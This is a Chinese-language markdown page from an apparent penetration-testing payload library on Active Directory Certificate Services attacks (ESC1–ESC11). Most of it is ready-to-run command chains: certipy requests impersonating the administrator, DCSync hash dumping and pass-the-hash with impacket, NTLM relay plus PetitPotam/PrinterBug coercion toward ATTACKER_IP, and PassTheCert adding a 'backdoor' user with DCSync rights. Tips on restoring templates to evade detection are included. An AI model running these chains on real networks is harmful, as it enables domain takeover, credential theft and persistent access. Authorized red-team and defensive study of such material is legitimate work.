# 内网/后渗透 — ADCS 攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:ADCS发现 / ESC1-ESC8 / ESC9-11 / Web Enrollment / 证书认证方法

---

## ADCS 发现与枚举

**前置条件：** 已获得域内低权限凭据（密码/NTLM hash/TGT）

### 1. certipy find（推荐）

```
# 全面枚举（含漏洞模板检测）
certipy find -u user@domain.com -p 'password' -dc-ip 10.0.0.1 -vulnerable
certipy find -u user@domain.com -hashes :ntlm_hash -dc-ip 10.0.0.1 -vulnerable

# 输出文件：
# YYYYMMDDHHMMSS_Certipy.zip → 解压后含 .txt/.json/.html 三种格式
# 重点查看：Certificate Templates 部分 → 标记为 'ESC1'/'ESC2' 等的模板
```

### 2. 手动 Web Enrollment 检测

```bash
# ADCS Web Enrollment 端点（HTTP 证书申请接口）
curl -k https://CA_SERVER/certsrv/
curl -k https://CA_SERVER/certsrv/certfnsh.asp
curl -k https://CA_SERVER/certsrv/mscep_admin/
curl -k https://CA_SERVER/certsrv/mscep/

# 响应特征：包含 "Microsoft Active Directory Certificate Services" 或 "证书服务"
# 响应 401 → 需要 NTLM 认证 → 可用于 ESC8 中继

# certutil 检测（Windows）
certutil -config - -ping
certutil -TCAInfo
certutil -ADTemplate
```

### 3. 无 certipy 时的备用枚举

```
# 查找 CA 服务器
nltest /dclist:domain.com          # 看 DC 列表
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"}  # PowerShell
mmc → 添加"证书颁发机构"管理单元     # GUI 确认

# LDAP 查询模板
ldapsearch -H ldap://DC_IP -x -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com"
```

---

## 证书认证方法速查

拿到 .pfx 证书后，三种认证方式：

| 方法 | 工具 | 场景 | 命令 |
|------|------|------|------|
| **PKINIT** | `certipy auth` / `gettgtpkinit.py` | 获取 TGT → DCSync/横向 | `certipy auth -pfx admin.pfx -dc-ip 10.0.0.1` |
| **Schannel** | `PassTheCert` | LDAPS 直接操作（无需 TGT） | `PassTheCert.py -pfx admin.pfx -action add_user ...` |
| **PKINIT (手动)** | `PKINITtools` | Shadow Credentials 链 | `gettgtpkinit.py -cert-pfx admin.pfx domain.com/username ccache.kirbi` |

### certipy auth 完整流程

```
# 1. 用证书获取 TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -username administrator -domain domain.com

# 输出：
# [*] Got TGT for administrator@domain.com
# [*] Got NT hash: aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe...

# 2. 用 NTLM hash 做 DCSync
impacket-secretsdump domain.com/administrator@DC_IP -hashes :fc525c9683e8fe...

# 3. 或直接 Pass-the-Hash 横向
impacket-wmiexec -hashes :fc525c9683e8fe... domain.com/administrator@TARGET_IP
```

### PassTheCert（Schannel 认证，无需 TGT）

```
# 添加用户
PassTheCert.py -pfx admin.pfx -action add_user -user backdoor -password 'P@ssw0rd!' -domain domain.com -dc-ip 10.0.0.1

# 修改 DACL（赋予 DCSync 权限）
PassTheCert.py -pfx admin.pfx -action write_dacl -user backdoor -rights DCSync -domain domain.com -dc-ip 10.0.0.1
```

---

### ADCS ESC1攻击  `adcs-esc1`

利用ESC1模板允许注册者提供SAN (Subject Alternative Name)
子类：**ESC1** · tags: `adcs` `esc1` `certificate` `high-value`

**前置条件：** 域环境；ADCS服务；存在ESC1模板（CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + 允许认证 EKU）

**ESC1 检测条件（模板需同时满足）：**
1. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志启用 → 注册者可自定义 Subject
2. 模板包含认证类 EKU（Client Authentication / Smart Card Logon / PKINIT Client Authentication）
3. 模板允许低权限用户注册（Enrollment Rights 含 Authenticated Users / Domain Users / Domain Computers）
4. 模板不需要 CA 证书管理器审批（`mspki-enrollment-flag` 不含 `CT_FLAG_PEND_ALL_REQUESTS`）

> ⚠️ **ESC1 是 ADCS 最常见攻击路径**：只要能注册证书 → 指定任意用户 UPN/SAN → 拿到该用户 TGT → 域管理员。

**攻击链：**

**1. 探测ESC1模板**  _[linux]_

```
certipy find -u user@domain.com -p 'password' -dc-ip DC_IP -vulnerable

# 输出中查找：
#   [!] Vulnerabilities
#     ESC1  : 'VULNERABLE_TEMPLATE'  ← 直接标记
#
# 或手动确认模板属性：
#   - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT : True
#   - EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
#   - Enrollment Rights: Authenticated Users
```

**2. 请求证书（指定管理员UPN）**  _[linux]_

```
# -upn 参数指定要冒充的用户（certipy 会自动设置 SAN）
certipy req -u user@domain.com -p 'password' -ca 'CA_NAME' -target CA_SERVER_IP -template 'VULNERABLE_TEMPLATE' -upn administrator@domain.com

# 输出：administrator.pfx → 包含管理员身份的证书

# 常见变体：
# -upn administrator@domain.com           → 域管理员
# -upn 'administrator@domain.local'       → 明确 FQDN
# -sid S-1-5-21-xxxx-xxxx-xxxx-500         → 用 SID 指定用户（某些场景 UPN 不可用）

# 也可手动生成 CSR：
# openssl req -new -key key.pem -out csr.csr -subj "/CN=attacker" -addext "subjectAltName=otherName:UPN;administrator@domain.com"
```

**3. 证书认证获取 TGT**  _[linux]_

```
# 方式A：certipy auth（推荐）
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 方式B：PKINITtools
gettgtpkinit.py -cert-pfx administrator.pfx 'domain.com/administrator' administrator.ccache
export KRB5CCNAME=administrator.ccache

# 方式C：直接提取 NTLM hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP -username administrator -domain domain.com
# 输出 NTLM hash → 可直接用于 DCSync 或 PtH
```

**4. 验证权限**  _[linux]_

```
# DCSync 验证（最直接）
impacket-secretsdump domain.com/administrator@DC_IP -hashes :<NTLM_HASH>
# 成功输出所有域用户 hash → 域控已沦陷

# 或直接横向到 DC
impacket-wmiexec -hashes :<NTLM_HASH> domain.com/administrator@DC_IP
```

**ESC1 关键排错：**
- `CERTSRV_E_TEMPLATE_DENIED` → 当前用户无注册权限，换模板
- `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` → 模板要求 Email 字段，填充 `-email attacker@domain.com`
- `KDC_ERR_CLIENT_NAME_MISMATCH` → UPN 与实际用户不匹配，检查 `-upn` 参数
- 证书拿到但 `certipy auth` 失败 → 检查证书 EKU（需 Client Authentication OID）

---

### ADCS ESC2攻击  `adcs-esc2`
利用ESC2模板配置错误
子类：**ESC2** · tags: `adcs` `esc2` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC2模板

**攻击链：**

**1. 探测ESC2模板**  _[linux]_
_探测ESC2模板_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```

**2. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**3. 使用证书认证**  _[linux]_
_使用证书认证_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```

---

### ADCS ESC3攻击  `adcs-esc3`
利用ESC3注册代理配置错误
子类：**ESC3** · tags: `adcs` `esc3` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC3配置

**攻击链：**

**1. 探测ESC3**  _[linux]_
_探测ESC3配置_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```

**2. 获取注册代理证书**  _[linux]_
_获取注册代理证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```

**3. 代表其他用户请求证书**  _[linux]_
_代表管理员请求证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```

---

### ADCS ESC4攻击  `adcs-esc4`
利用ESC4模板权限配置错误
子类：**ESC4** · tags: `adcs` `esc4` `certificate`

**前置条件：** 域环境；ADCS服务；对模板有写权限

**攻击链：**

**1. 探测ESC4**  _[linux]_
_探测模板权限_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```

**2. 修改模板配置**  _[linux]_
_修改模板配置_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```

**3. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**4. 恢复模板配置**  _[linux]_
_恢复模板配置_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```

---

### ADCS ESC6攻击  `adcs-esc6`
利用ESC6编辑标志配置错误
子类：**ESC6** · tags: `adcs` `esc6` `certificate`

**前置条件：** 域环境；ADCS服务；CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**攻击链：**

**1. 探测ESC6**  _[linux]_
_探测CA配置_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```

**2. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```

**3. 使用证书认证**  _[linux]_
_认证获取TGT_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

### ADCS ESC8攻击  `adcs-esc8`
利用ESC8 HTTP端点进行NTLM中继
子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**前置条件：** 域环境；ADCS HTTP端点；可触发NTLM认证

**攻击链：**

**1. 探测ESC8**  _[linux]_
_探测HTTP端点_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```

**2. 设置NTLM中继**  _[linux]_

```
# 中继到 ADCS Web Enrollment HTTP 端点
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs -of base64.pfx

# 关键参数：
# --adcs           → 启用 ADCS 攻击模式，请求证书时自动填充模板名
# -of base64.pfx   → 证书保存为 base64 编码，方便复制
# --template       → 指定模板名（如 DomainController），默认 Machine/User
```

**3. 触发强制认证（Coercion）**  _[linux]_

```
# 方式A：PetitPotam（MS-EFSRPC，最常用）
python3 PetitPotam.py -u user -p 'password' -d domain.com ATTACKER_IP TARGET_IP
python3 PetitPotam.py -hashes :ntlm_hash -d domain.com ATTACKER_IP TARGET_IP

# 方式B：PrinterBug（MS-RPRN）
python3 printerbug.py domain.com/user:password@TARGET_IP ATTACKER_IP
python3 printerbug.py domain.com/user@TARGET_IP -hashes :ntlm_hash ATTACKER_IP

# 方式C：DFSCoerce（MS-DFSNM）
python3 dfscoerce.py -u user -p password -d domain.com ATTACKER_IP TARGET_IP

# 方式D：ShadowCoerce（MS-FSRVP）
python3 shadowcoerce.py -u user -p password -d domain.com ATTACKER_IP TARGET_IP

# 选择策略：
# - DC 一般能用 PetitPotam（除非打了 KB5005413 补丁）
# - 成员服务器优先尝试 PrinterBug（端口 445 开放前提下）
# - 以上均失败时尝试 DFSCoerce / ShadowCoerce
```

**4. 验证中继结果**  _[linux]_

```
# ntlmrelayx 输出中查找：
# [*] GOT BASE64 ENCODED PKCS12 FILE  ← 成功获取证书
# 复制 base64 内容 → 解码 → certipy auth
echo 'base64_string' | base64 -d > relayed.pfx
certipy auth -pfx relayed.pfx -dc-ip DC_IP
```

### ESC8 变体：HTTP→LDAP 中继链

```
# 若目标 CA 不允许 HTTP 端点，可尝试 HTTP→LDAP 中继：
# 中继到 LDAP 直接写入 Shadow Credentials（见 14-domain.md §Shadow Credentials）
impacket-ntlmrelayx -t ldaps://DC_IP --shadow-credentials -smb2support
```

---

### ADCS ESC9-ESC11（新ESC变体）  `adcs-esc9-11`

| 变体 | 条件 | 核心原理 | 利用难度 |
|------|------|---------|---------|
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` + `StrongCertificateBindingEnforcement`=0 | MS-ADCS 未嵌入 SID 到证书 → UPN 可被覆写 | 中 |
| **ESC10** | `CT_FLAG_NO_SECURITY_EXTENSION` + `StrongCertificateBindingEnrollmentEnforcement`=0 | NTAuthCertStore 任意 CA 可签发 → 信任链绕过 | 高 |
| **ESC11** | `IF_ENFORCEENCRYPTICERTREQUEST` 未启用 | CA 接受无加密的 ICS 请求 → 中间人签名 | 高 |

> ESC9-11 实战命中率远低于 ESC1/ESC8，优先测试 ESC1 → ESC8 → ESC4 → ESC2/3/6 → 再考虑 ESC9-11。

### ESC9 快速检测

```
# 检查注册表（Windows，需在 CA 服务器上）
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0 → 易受 ESC9 攻击
# 1 → 部分缓解
# 2 → 完全缓解

# certipy 检测
certipy find -u user@domain.com -p 'password' -dc-ip DC_IP -vulnerable
# 查看输出中是否标记 ESC9
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`18-exchange.md`](18-exchange.md) · 下一篇:[`20-sharepoint.md`](20-sharepoint.md)
